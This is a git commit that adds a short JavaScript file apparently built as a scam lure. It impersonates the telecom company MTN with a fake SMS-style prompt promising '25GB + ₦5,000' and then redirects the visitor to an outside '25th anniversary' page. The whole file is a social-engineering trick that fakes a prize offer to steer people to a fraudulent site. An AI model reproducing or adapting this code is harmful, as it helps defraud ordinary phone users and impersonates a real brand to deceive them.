a1e8ccb936441b12012d021b6d723bf387fa08e9
ekpanewblog5 <ukpehaitid3@gmail.com>
2026-07-15 05:30:18 -0500

    Create mtn-25th-verify.js

---
+++ mtn-25th-verify.js
@@ -0,0 +1,5 @@
+var password = '25GB + ₦5,000'
+password=prompt('SMS: Congratulations, your MTN Number is eligible to receive 25GB + ₦5,000 From MTN, click OK to Activate now','25GB + ₦5,000');
+if (password != '25GB + ₦5,000') {
+location.href='https://ebekpone.com/25th-annivwesary.html';
+}
